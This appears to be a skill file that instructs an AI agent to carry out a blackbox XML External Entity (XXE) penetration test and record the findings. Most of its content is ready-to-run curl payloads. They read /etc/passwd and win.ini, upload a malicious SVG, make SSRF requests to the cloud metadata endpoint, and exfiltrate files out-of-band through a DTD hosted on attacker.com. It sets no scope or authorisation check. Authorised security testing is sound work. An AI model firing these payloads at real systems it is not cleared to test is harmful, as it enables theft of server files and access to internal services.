---
name: blackbox-xxe
description: >-
  Actively test a target web application for XML External Entity (XXE)
  vulnerabilities using blackbox techniques. Reads pentest/target-map.md,
  identifies endpoints that parse XML input, injects XXE payloads targeting
  local file read and SSRF, tests for blind XXE via out-of-band DNS/HTTP
  callbacks, and writes confirmed findings with PoC curl commands to
  pentest/xxe-results.md. Use when asked to find XXE or XML injection in a
  blackbox pentest.
---

# Blackbox XXE Detection

You are actively testing a web application for XML External Entity vulnerabilities without source code access. You will inject XXE payloads into XML-accepting endpoints and analyze responses for file content or OOB callbacks.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## Phase 1: Identify XML Endpoints

Read `pentest/target-map.md` and find:

1. **Explicit XML endpoints**: `Content-Type: application/xml` or `text/xml` in the target map
2. **File upload endpoints**: Accept XML, SVG, DOCX, XLSX, PPTX files (all ZIP-containing XML)
3. **API endpoints**: SOAP services, REST APIs that may accept XML
4. **Import/export features**: Data import via XML, RSS/Atom feeds, sitemap processing
5. **GraphQL**: May accept `application/json` but worth testing XML variants

Write candidates to `pentest/xxe-recon.md`.

---

## Phase 2: Basic XXE Payload Testing

### Test 1: File Read XXE (standard)

For each XML endpoint, inject a DOCTYPE with an external entity:

```bash
# /etc/passwd read via XXE
curl -sk -X POST "<TARGET_URL>/api/import" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>'

# Windows path
curl -sk -X POST "<TARGET_URL>/api/import" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>'
```

**Confirmed XXE** if `/etc/passwd` contents appear in the response.

### Test 2: Try JSON → XML Content-Type Switch

Some APIs that accept JSON may also accept XML if you change the Content-Type:

```bash
# Original JSON request to an endpoint
# curl -X POST /api/data -H "Content-Type: application/json" -d '{"name":"test"}'

# Switch to XML
curl -sk -X POST "<TARGET_URL>/api/data" \
  -H "Content-Type: application/xml" \
  -H "Accept: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name></root>'
```

### Test 3: SVG File Upload XXE

If the target accepts SVG image uploads:

```bash
# Create malicious SVG
cat > /tmp/xxe.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
EOF

# Upload SVG
curl -sk -X POST "<TARGET_URL>/api/upload" \
  -H "Authorization: Bearer <TOKEN>" \
  -F "file=@/tmp/xxe.svg;type=image/svg+xml"

# Then access the uploaded file to see if entity was resolved
curl -sk "<TARGET_URL>/uploads/xxe.svg"
```

### Test 4: Blind XXE via SSRF (internal network reach)

```bash
# Make server fetch an internal resource via XXE
curl -sk -X POST "<TARGET_URL>/api/import" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>'

# Internal service reach
curl -sk -X POST "<TARGET_URL>/api/import" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/">]>
<root>&xxe;</root>'
```

---

## Phase 3: Blind XXE (Out-of-Band)

When the server doesn't reflect the entity value, use OOB:

### OOB via Direct Entity
```bash
OOB_URL="http://abc123.oast.me"

curl -sk -X POST "<TARGET_URL>/api/parse" \
  -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"$OOB_URL/ping\">]>
<root>&xxe;</root>"
```

### OOB with File Exfiltration via Parameter Entities
```bash
# Host this DTD on your server: http://attacker.com/evil.dtd
# evil.dtd content:
# <!ENTITY % file SYSTEM "file:///etc/passwd">
# <!ENTITY % exfil "<!ENTITY &#x25; data SYSTEM 'http://attacker.com/?d=%file;'>">
# %exfil;

curl -sk -X POST "<TARGET_URL>/api/import" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %data;
]>
<root>trigger</root>'
```

### OOB with DNS (No HTTP needed)
```bash
# If the server can make DNS lookups but not HTTP:
curl -sk -X POST "<TARGET_URL>/api/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://abc123.oast.me/xxe-test">]>
<root>&xxe;</root>'
# Check DNS logs at oast.me for lookup of "abc123.oast.me"
```

---

## Phase 4: SOAP/XML-RPC XXE

If the target exposes SOAP or XML-RPC services:

```bash
# SOAP request with XXE
curl -sk -X POST "<TARGET_URL>/soap" \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"test\"" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <test>&xxe;</test>
  </soap:Body>
</soap:Envelope>'
```

---

## Phase 5: XInclude Injection

If server processes XML but you cannot control the DOCTYPE:

```bash
# XInclude payload (works without DOCTYPE)
curl -sk -X POST "<TARGET_URL>/api/process" \
  -H "Content-Type: application/xml" \
  -d '<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>'
```

---

## Output Format

Write findings to `pentest/xxe-results.md`:

```markdown
# XXE Assessment Results

## Executive Summary
- Endpoints tested: [N]
- Confirmed XXE (File Read): [N]
- Confirmed XXE (OOB/Blind): [N]
- Not Vulnerable: [N]

## Findings

### [CONFIRMED XXE] POST /api/import - XML body

- **Endpoint**: `POST /api/import`
- **Input**: XML request body (Content-Type: application/xml)
- **Impact**: Read arbitrary local files accessible to the web server process; potential SSRF to internal services
- **Evidence**: `/etc/passwd` contents returned in response body
- **PoC**:
  ```bash
  curl -sk -X POST "https://target.com/api/import" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <import><data>&xxe;</data></import>'
  # Expected: root:x:0:0:root:/root:/bin/bash (and other /etc/passwd entries)
  ```
- **Remediation**: Disable DTD processing entirely. In Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`. Use defusedxml (Python), set LIBXML_NONET flag (PHP).

### [BLIND XXE] POST /api/parse - SVG upload

- **Evidence**: Out-of-band HTTP request received at attacker-controlled server when uploading malicious SVG
- **PoC**:
  ```bash
  # Create malicious SVG
  cat > /tmp/evil.svg << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://your-oob.com/xxe">]>
  <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
  EOF

  curl -sk -X POST "https://target.com/api/upload" \
    -F "file=@/tmp/evil.svg;type=image/svg+xml"
  # Check your OOB server for incoming request
  ```
- **Remediation**: Sanitize SVG uploads using a safe SVG parser, or convert SVG to a raster format (PNG) on upload before storage.
```

After writing results, delete `pentest/xxe-recon.md`.

---

## Important Reminders

- Always test the Content-Type switch trick (JSON endpoint → XML) — many APIs are misconfigured.
- SVG and DOCX/XLSX uploads are excellent XXE vectors that are frequently overlooked.
- Blind XXE via OOB is just as severe as reflected XXE — still a Critical finding.
- LIBXML_NOENT in PHP *expands* entities (does NOT protect) — a common developer misconception.
- Clean up: delete `pentest/xxe-recon.md` after writing results.
